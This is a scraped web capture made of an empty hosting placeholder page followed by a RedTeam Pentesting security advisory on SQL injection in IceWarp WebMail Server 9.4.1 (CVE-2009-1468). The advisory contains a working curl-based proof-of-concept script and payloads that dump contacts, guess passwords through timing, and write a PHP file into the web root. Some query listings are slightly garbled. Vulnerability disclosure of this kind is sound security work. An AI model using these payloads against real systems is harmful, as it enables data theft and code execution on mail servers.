=== Content from www.vupen.com_801a966d_20250124_132618.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from www.redteam-pentesting.de_39a37572_20250124_132618.html ===
+49 241 510081-0kontakt@redteam-pentesting.de[DE](/de/advisories/rt-sa-2009-003/)[![RedTeam Pentesting Logo](/img/redteam-logo_hub5a66d245245ce30f53b50d2b4dfb31b_19123_120x0_resize_q100_h2_box_3.webp)](/)[DE](/de/advisories/rt-sa-2009-003/ "Deutsche Version")

* Company
  Company
  + [About us](/en/redteam/)
  + [History](/en/redteam/history/)
  + [Press](/en/press/)
  + [News Archive](/en/archive/)
* Pentest
  Pentest
  + [Definition](/en/pentest/)
  + [Types of Tests](/en/pentest/types/)
  + [Workflow](/en/pentest/workflow/)
  + [FAQ](/en/faq/)
* Publications
  Publications
  + [Overview](/en/publications/)
  + [Advisories](/en/advisories/)
  + [Talks](/en/talks/)
  + [Other Publications](/en/publications-other/)
* [Career](https://jobs.redteam-pentesting.de/)
* [Blog](https://blog.redteam-pentesting.de/)
* [Contact](#contactform)

Contact

Contact us

+49 241 510081-0kontakt@redteam-pentesting.de[Contact form](#contactform)JavaScript is not enabled in your browser. Please consider that some functions might not be available for you.![RedTeam Pentesting Header](/img/header/hl_header-1_hu0f2d230fb5185511a90e67c2e597c0b5_900546_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-2_hub774373357e916cb041b4943299d8717_1132770_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-3_hub8fc12cb70b2021e589c6810b4b53d04_895916_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-4_hu27d71f64bf1f030161a23c2dcd666f59_1015002_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-5_hud32f8d698ff23308f4d8b8566aae5928_933115_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-6_hu1bc03534cd122894ef676fff89833ac5_1144618_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-7_hu91e55bd77169043ae9e542f1b5f8f2f4_1354043_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-8_hu155130647c165410f2ffa35227549138_1321813_1000x0_resize_q100_h2_box.webp)[newer](https://www.redteam-pentesting.de/en/advisories/rt-sa-2009-004/)[back to overview](/en/advisories)[older](https://www.redteam-pentesting.de/en/advisories/rt-sa-2009-002/)

[Text Version](/en/advisories/rt-sa-2009-003.txt)

## IceWarp WebMail Server: SQL Injection in Groupware Component

During a penetration test RedTeam Pentesting discovered multiple
SQL-Injections in the IceWarp WebMail Server. Attackers that are in
control of a user account for the web-based email and groupware
components are able to execute arbitrary SQL SELECT statements and
therefore read any data from the DBMS that are accessible by the Icewarp
eMail Server.

### Details

* Product: IceWarp eMail Server / WebMail Server
* Affected Versions: 9.4.1
* Fixed Versions: 9.4.2
* Vulnerability Type: SQL Injection
* Security Risk: high
* Vendor URL: `http://www.icewarp.com/`
* Vendor Status: notified, fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2009-003`
* Advisory Status: published
* CVE: CVE-2009-1468
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1468`

### Introduction

“Feature complete yet easy to use, WebMail Server Pro provides feature
rich Web 2.0 web-based access to email, calendars, contacts, files and
shared data from any computer with browser and internet connection,
without the usual configuration hassle. Thanks to advanced technologies
and application-like look and feel, Pro suggests it was born to become
the ultimate replacement of Outlook and similar desktop mail clients.”

(from the vendor’s homepage)

### More Details

The IceWarp eMail Server’s web-based groupware component provides
functionality for users to store, for example, contact information,
notes, a journal or files. A search form can be used to search for such
stored items.

When users search, for example, for certain files, using the provided
search form, an HTTP POST request containing the search query in XML
form is sent from the browser to the PHP script at
`https://example.com/webmail/server/webmail.php`:

```
<iq sid="73aaafec4a8db27af49c4c43bca4ac13"
    uid="1239870305230" type="get" format="json">
  <query xmlns="webmail:iq:items">
    <account uid="user@example.com">
      <folder uid="Files">
        <item>
          <values>
            <evntitle> </evntitle>
            <evnnote> </evnnote>
            [..]
          </values>
          <filter>
            <offset>0</offset>
            <limit>60</limit>
            <order_by>EVNTYPE asc</order_by>
            <sql>(EVNIceWarp WebMail Server: SQL Injection in Groupware Component LIKE '%SQL INJECTION TEST%' OR
                  EVNNOTE LIKE '%SQL INJECTION TEST%')
            </sql>
          </filter>
        </item>
      </folder>
    </account>
  </query>
</iq>

```

It is evident that SQL expressions are used to find matching items and
order the results. Using the information provided within the POST
request, two SQL queries are constructed and executed on the database
(relevant user-controlled parts marked with a leading “>”):

```
Select EVN_ID, EVNRCR_ID, evntitle, evnnote, evnlocation, evnstartdate,
       evnstarttime, evntype, evncolor, evncomplete
  From Event Where
    (EVNGRP_ID = '3a7e072a3002') And
    (
      (
>        (EVNIceWarp WebMail Server: SQL Injection in Groupware Component LIKE '%SQL INJECTION TEST%' OR
>         EVNNOTE LIKE '%SQL INJECTION TEST%')
      ) AND
      evnclass <> 'O'
    ) And
    (EvnFolder='Files')
    Order By
>       EVNLOCATION asc
    LIMIT 0,45

```
```
Select Count(EVN_ID) As Count_ From Event Where
  (EVNGRP_ID = '3a7e072a3002') And
  (
>    (EVNIceWarp WebMail Server: SQL Injection in Groupware Component LIKE '%SQL INJECTION TEST%' OR
>     EVNNOTE LIKE '%SQL INJECTION TEST%')
  ) And
  (EvnFolder='Files')

```

Data is only returned from the database to the web application when both
queries are syntactically correct. Due to a different nesting level of
parentheses around the SQL queries’ user-manipulable parts, successful
(non-blind) SQL injection requires the use of two elements within the
original HTTP POST request.

The following examples show the two queries that are executed when the
<sql> element contains the string “0=1) /\* " and the <order\_by> element
contains the string “\*/)–”. User input that is active within an SQL
query is marked with a “>”, user input that begins or ends a comment is
marked with a “+”, and application-provided query parts that are now
commented out are marked with a “|”:

```
Select EVN_ID, EVNRCR_ID, evntitle, evnnote, evnlocation, evnstartdate,
       evnstarttime, evntype, evncolor, evncomplete
  From Event Where
    (EVNGRP_ID = '3a7e072a3002') And
    (
      (
>        0=1)
+        /* part of the <sql> element
|      ) AND
|      evnclass <> 'O'
|    ) And
|    (EvnFolder='Files') Order By
+    part of the <order_by> element */
>    )--
    LIMIT 0,45

```
```
Select Count(EVN_ID) As Count_ From Event Where
  (EVNGRP_ID = '3a7e072a3002') And
  (
>     0=1)
+     /* part of the <sql> element
|   ) And
|   (EvnFolder='Files')

```

Note that this method requires a DBMS that allows unbalanced C-style
(/\*\*/) comments in its SQL syntax, such as SQLite3 or MySQL < 5.0.51.
For other DBMS, blind SQL injection into the first SQL query is another
option.

### Proof of Concept

The following shell script can be used to construct a valid search
request as mentioned above. It expects a valid session ID and
corresponding username as commandline arguments, followed by arguments
that are inserted into the <order\_by> and <sql> elements of the POST
request.

```
#!/bin/sh

sid=$1
uid=$2
orderby=$3
if [ -n "$4" ] ; then
    sql=$4
else
    sql="1=0)/*"
fi
curl --silent -d '<iq sid="'$sid'" type="get" format="json">
  <query xmlns="webmail:iq:items">
    <account uid="'$uid'">
      <folder uid="Files">
        <item><values><evntitle></evntitle></values>
          <filter><offset></offset><limit></limit>
            <order_by>'"$orderby"'</order_by>
            <sql>'"$sql"'</sql>
          </filter>
        </item>
      </folder>
    </account>
  </query>
</iq>' https://example.com/webmail/server/webmail.php | \
perl -pe 's/{/\n/g' | grep "result::" | \
sed -e 's/^"VALUE":"result:://' -e 's/"}]}],"ATTRIBUTES":$//'

```

For DBMS that support unbalanced C-Style comments, data can for example
be retrieved from the database as follows:

```
$ ./sql_inject.sh 73aaafec4a8db27af49c4c43bca4ac13 user@example.com \
"*/) UNION SELECT random(),'NULL',
('result::'||ItmFirstname||':'||ItmSurname) FROM ContactItem"

Joe:Plumber
John:Doe
Agent:Smith
Jane:Doe
Joe:User

```

For other DBMS, blind SQL injection is a possibility. The following
example illustrates how a password for a certain user account is
retrieved on an installation of the IceWarp eMail server that uses a
recent version of MySQL for storing user account information:

```
$ time ./sql_inject.sh \
73aaafec4a8db27af49c4c43bca4ac13 user@example.com "" \
"1=0)) UNION SELECT 1,2,IF((SELECT COUNT(*) FROM users
WHERE U_Mailbox='user' AND U_Password LIKE 'a&#37;'),SLEEP(5),1)-- "
real    0m0.334s
user    0m0.053s
sys     0m0.007s
[...]
$ time ./sql_inject.sh \
73aaafec4a8db27af49c4c43bca4ac13 user@example.com "" \
"1=0)) UNION SELECT 1,2,IF((SELECT COUNT(*) FROM users
WHERE U_Mailbox='user' AND U_Password LIKE 't&#37;'),SLEEP(5),1)-- "
real    0m5.441s
user    0m0.037s
sys     0m0.013s
[...]
$ time ./sql_inject.sh \
73aaafec4a8db27af49c4c43bca4ac13 user@example.com "" \
"1=0)) UNION SELECT 1,2,IF((SELECT COUNT(*) FROM users
WHERE U_Mailbox='user' AND U_Password LIKE 'test'),SLEEP(5),1)-- "
real    0m5.418s
user    0m0.040s
sys     0m0.010s

```

Depending on the DBMS configuration, creation of arbitrary files and/or
code execution might also be possible. The following example illustrates
the creation of a PHP script within the web application’s root directory
using the SELECT .. INTO DUMPFILE functionality provided by MySQL:

```
$ ./sql_inject.sh a3779402b23fa4acdcba6be907521acb user@example.com "" \
"1=0)) UNION SELECT '','','&lt;?php phpinfo();?&gt;'
INTO DUMPFILE 'c:/Program Files/Merak/html/webmail/phpinfo.php'-- "

```
### Workaround

None.

### Fix

Upgrade to version 9.4.2.

### Security Risk

The risk of this vulnerability is estimated as high. Depending on the
IceWarp eMail Server configuration, and configuration of the DBMS used,
attackers authenticated to the web application can leverage it to
retrieve, for example, users’ contacts, notes or journal entries, obtain
user credentials, and/or execute arbitrary code.

### History

* 2009-03-23 Vulnerabilities identified during a penetration test
* 2009-04-01 Meeting with customer and vendor
* 2009-04-28 CVE number assigned
* 2009-05-05 Vendor publishes fixed version
* 2009-05-05 Advisory released

### RedTeam Pentesting GmbH

RedTeam Pentesting offers individual penetration tests, short pentests,
performed by a team of specialised IT-security experts. Hereby, security
weaknesses in company networks or products are uncovered and can be
fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
<https://www.redteam-pentesting.de>.

# Contact us

We are happy to advise you and answer your questions.Contact dataPhone: +49 241 510081-0
Email: kontakt@redteam-pentesting.de
([GnuPG/PGP public key](/gpg/RedTeam-Pentesting-GPG-Kontakt-Key.asc))Visit and Postal AddressRedTeam Pentesting GmbH
Alter Posthof 1
52062 AachenEmployees of RedTeam Pentesting may be contacted directly at
firstname.lastname@redteam-pentesting.de:
([GnuPG/PGP public keys](/gpg/RedTeam-Pentesting-GPG-All-Keys.asc))Contact formâ![CAPTCHA]()
I agree to the transmission and processing of my data to RedTeam Pentesting according to RedTeam Pentesting’s [privacy policy](/en/imprint/privacy).
Company

* [About us](/en/redteam/)
* [History](/en/redteam/history/)
* [Press](/en/press/)
* [News Archive](/en/archive/)
Pentest

* [Definition](/en/pentest/)
* [Types of Tests](/en/pentest/types/)
* [Workflow](/en/pentest/workflow/)
* [FAQ](/en/faq/)
Publications

* [Overview](/en/publications/)
* [Advisories](/en/advisories/)
* [Talks](/en/talks/)
* [Other Publications](/en/publications-other/)
[Career](https://jobs.redteam-pentesting.de/)[Blog](https://blog.redteam-pentesting.de/)[Contact](#contactform)[Imprint](/en/imprint/) |
[Privacy Policy](/en/imprint/privacy/)
